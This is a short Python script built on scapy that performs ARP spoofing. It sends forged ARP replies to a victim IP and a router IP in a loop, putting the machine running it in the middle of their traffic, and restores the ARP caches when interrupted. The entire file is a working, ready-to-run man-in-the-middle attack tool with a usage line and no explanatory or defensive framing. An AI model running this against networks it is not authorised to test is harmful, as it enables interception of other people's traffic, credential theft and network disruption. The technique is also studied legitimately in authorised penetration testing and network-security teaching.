from scapy.all import ARP, send, Ether, srp
import sys
import time

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for {target_ip}")
        return
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)

def restore_arp(victim_ip, router_ip):
    victim_mac = get_mac(victim_ip)
    router_mac = get_mac(router_ip)
    
    if victim_mac is None or router_mac is None:
        print("Failed to restore ARP cache, couldn't find MAC addresses.")
        return
    
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac), count=4, verbose=False)
    send(ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac), count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arpspoof.py <Victim_IP> <Router_IP>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    try:
        print(f"Starting ARP spoofing: Victim {victim_ip}, Router {router_ip}")
        while True:
            spoof(victim_ip, router_ip)
            spoof(router_ip, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing. Restoring ARP tables...")
        restore_arp(victim_ip, router_ip)
        print("ARP tables restored. Exiting.")
